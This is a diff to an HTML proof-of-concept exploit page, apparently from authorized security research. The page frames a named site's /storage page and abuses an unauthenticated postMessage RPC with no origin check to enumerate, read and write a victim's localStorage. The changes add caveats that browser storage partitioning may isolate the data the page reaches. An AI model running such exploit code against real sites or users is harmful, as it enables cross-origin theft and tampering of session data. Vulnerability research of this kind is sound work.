@@ -28,10 +28,21 @@
 <div class="banner">
   <strong>Authorized internal security research only.</strong> This page demonstrates that any external
   origin can frame <code>&lt;target&gt;/storage</code> and drive the unauthenticated <code>db-handler.js</code>
-  <code>postMessage</code> RPC to read/enumerate/write the victim's <code>localStorage</code> on the target
-  origin, from an attacker page, using the victim's existing session cookies. Do not use outside an
-  authorized test environment. See the companion report
-  <code>../storage-bridge-cross-origin-report.md</code> for full source evidence.
+  <code>postMessage</code> RPC with no <code>event.origin</code> check. Do not use outside an
+  authorized test environment. See the companion report <code>../report.md</code> for full source evidence.
+</div>
+
+<div class="banner" style="background:#fde2e1;border-color:#b30000;">
+  <strong>Read this before drawing conclusions.</strong> The RPC firing and replying (below) does
+  <u>not</u> by itself prove it reached the real session's storage. Modern browsers apply
+  <strong>Storage Partitioning</strong>: a frame's storage is keyed by <code>(top-level site, frame site)</code>.
+  If this PoC page is hosted on a site unrelated to <code>arattai.in</code>, the framed <code>/storage</code>
+  page may get an isolated, empty bucket — writes/reads round-trip successfully but never touch the real
+  tab's data. <strong>You must run the "Cross-visibility test" below</strong> (or the Recent-Search
+  injection test) and confirm in the REAL logged-in tab's own console whether the value actually landed
+  there. Only that confirms full exposure vs. a partitioned/capped result. This does <em>not</em> apply the
+  same way if this PoC is hosted on another <code>*.arattai.in</code> subdomain — same-site framing is not
+  partitioned, and would be expected to show full real exposure.
 </div>
 
 <div class="row">
@@ -138,7 +149,9 @@
         'cross-origin page and announced readiness to us (attacker origin ' + location.origin + '). ' +
         'A same-origin-only shell would never receive this from an external page.');
       setStatus('origin', 'VULN', 'Handshake was accepted with target-origin arg "*" and no origin ' +
-        'gate on the receiver side (db-handler.js:15) — see log for raw event.');
+        'gate on the receiver side (db-handler.js:15) — RPC is reachable and unauthenticated. NOTE: ' +
+        'this alone does not prove the RPC reached the real tab\'s storage — run the cross-visibility ' +
+        'test below to confirm whether this browser\'s storage partitioning isolates it.');
       document.getElementById('btnEnumerate').disabled = false;
       document.getElementById('btnWriteProbe').disabled = false;
       document.getElementById('btnCustomRead').disabled = false;
@@ -195,20 +208,25 @@
       keys.push(resp.result);
     }
     if (keys.length) {
-      setStatus('enum', 'VULN', keys.length + ' key(s) enumerated cross-origin: ' + keys.join(', '));
+      setStatus('enum', 'VULN', keys.length + ' key(s) enumerated in the RPC\'s bucket: ' + keys.join(', ') +
+        '. Verify in the REAL tab\'s console whether these keys/values match — if this bucket is ' +
+        'partitioned, these may be leftovers from a prior PoC run, not real session data.');
       logLine('Enumerated keys:', keys);
 
       logLine('--- Reading value of first key via localStorage.getItem ---');
       var readResp = await requestLocalStorage('getItem', keys[0], 'getItem(' + keys[0] + ')');
       if (!readResp.timeout && !readResp.error) {
-        setStatus('read', 'VULN', 'Value of "' + keys[0] + '" read cross-origin (truncated): ' +
-          String(readResp.result).slice(0, 200));
+        setStatus('read', 'VULN', 'Value of "' + keys[0] + '" read from the RPC\'s bucket (truncated): ' +
+          String(readResp.result).slice(0, 200) + ' — confirm in the real tab whether this key/value ' +
+          'actually exists there before treating this as real-session exposure.');
       } else {
         setStatus('read', 'SAFE', 'No value returned (blocked or empty).');
       }
     } else {
-      setStatus('enum', 'SAFE', 'No keys returned — receiver rejected the request or storage is empty.');
-      setStatus('read', 'SAFE', 'Skipped — enumeration returned no keys.');
+      setStatus('enum', 'PENDING', 'No keys in this bucket. This is EXPECTED if storage is partitioned ' +
+        '(isolated empty bucket) — it does not by itself mean the receiver rejected the request. Use the ' +
+        'cross-visibility test below to tell the two cases apart.');
+      setStatus('read', 'PENDING', 'Skipped — enumeration returned no keys.');
     }
   };
 
@@ -222,8 +240,10 @@
     logLine('--- Verifying write via getItem ---');
     var readBack = await requestLocalStorage('getItem', CANARY_KEY, 'getItem(canary)');
     if (!readBack.timeout && readBack.result === CANARY_VAL) {
-      setStatus('write', 'VULN', 'Cross-origin write CONFIRMED — canary key/value round-tripped on ' +
-        targetOrigin() + '. Cleaning up…');
+      setStatus('write', 'VULN', 'Write+read round-tripped within the RPC\'s OWN bucket — proves the ' +
+        'unauthenticated RPC works, NOT yet that it reached the real tab\'s storage (that bucket may be ' +
+        'partitioned/isolated). Run the cross-visibility test below against the real tab to confirm. ' +
+        'Cleaning up…');
       await requestLocalStorage('removeItem', CANARY_KEY, 'removeItem(canary)');
       logLine('Canary key removed.');
     } else {
